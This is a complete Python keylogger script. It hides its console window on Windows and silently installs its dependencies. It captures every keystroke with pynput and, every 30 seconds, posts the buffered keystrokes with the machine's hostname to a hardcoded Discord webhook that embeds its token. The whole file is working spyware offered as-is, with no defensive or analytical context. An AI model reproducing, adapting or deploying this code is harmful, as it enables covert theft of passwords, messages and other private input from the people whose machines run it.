import sys
import subprocess
import time
import threading
import json
import socket
import requests
from datetime import datetime
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1441414829306024052/G24iY8Glidyu-RwwrNTYQmCHbgicbfPxtQA3QbfS12JFy0WsaQ7x2QJUFx0T-Hqmcl8E"
SEND_INTERVAL = 30

class SilentInstaller:
    @staticmethod
    def install():
        required = ['requests', 'pynput']
        for package in required:
            try:
                if package == 'pynput':
                    __import__('pynput.keyboard')
                else:
                    __import__(package)
            except ImportError:
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", package, 
                                         "--quiet", "--no-warn-script-location"],
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL,
                                        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                except:
                    pass

class KeyLogger:
    def __init__(self):
        self.log_buffer = []
        self.buffer_lock = threading.Lock()
        self.running = True
        self.hostname = socket.gethostname()
        
    def send_to_discord(self, content, is_startup=False):
        try:
            payload = {"content": content}
            requests.post(WEBHOOK_URL, json=payload, timeout=10)
            return True
        except:
            return False
    
    def convert_key(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            elif key == self.keyboard.Key.space:
                return " "
            elif key == self.keyboard.Key.enter:
                return "\n"
            elif key == self.keyboard.Key.tab:
                return "[TAB]"
            elif key == self.keyboard.Key.backspace:
                return "[BACKSPACE]"
            elif key == self.keyboard.Key.esc:
                return "[ESC]"
            elif key == self.keyboard.Key.ctrl_l or key == self.keyboard.Key.ctrl_r:
                return "[CTRL]"
            elif key == self.keyboard.Key.alt_l or key == self.keyboard.Key.alt_r:
                return "[ALT]"
            elif key == self.keyboard.Key.shift:
                return "[SHIFT]"
            elif key == self.keyboard.Key.cmd:
                return "[WIN]"
            else:
                key_str = str(key).replace("Key.", "")
                if len(key_str) > 1:
                    return f"[{key_str.upper()}]"
                return f"[{key_str}]"
        except:
            return "[UNKNOWN]"
    
    def on_press(self, key):
        with self.buffer_lock:
            self.log_buffer.append(self.convert_key(key))
    
    def send_logs(self):
        while self.running:
            time.sleep(SEND_INTERVAL)
            
            with self.buffer_lock:
                if not self.log_buffer:
                    continue
                
                log_text = "".join(self.log_buffer)
                if not log_text.strip():
                    continue
                
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if len(log_text) > 1800:
                    chunks = [log_text[i:i+1800] for i in range(0, len(log_text), 1800)]
                    for chunk in chunks:
                        message = f"**⌨️ {self.hostname} - {timestamp}**\n```{chunk}```"
                        self.send_to_discord(message)
                        time.sleep(1)
                else:
                    message = f"**⌨️ {self.hostname} - {timestamp}**\n```{log_text}```"
                    self.send_to_discord(message)
                
                self.log_buffer.clear()
    
    def start(self):
        from pynput import keyboard
        self.keyboard = keyboard
        
        SilentInstaller.install()
        
        startup_message = f"[{self.hostname}] Skrypt działa☑️"
        self.send_to_discord(startup_message)
        
        listener = keyboard.Listener(on_press=self.on_press)
        listener.daemon = True
        listener.start()
        
        send_thread = threading.Thread(target=self.send_logs, daemon=True)
        send_thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        except:
            self.running = False

def hide_console():
    if sys.platform == "win32":
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)

if __name__ == "__main__":
    hide_console()
    
    logger = KeyLogger()
    logger.start()
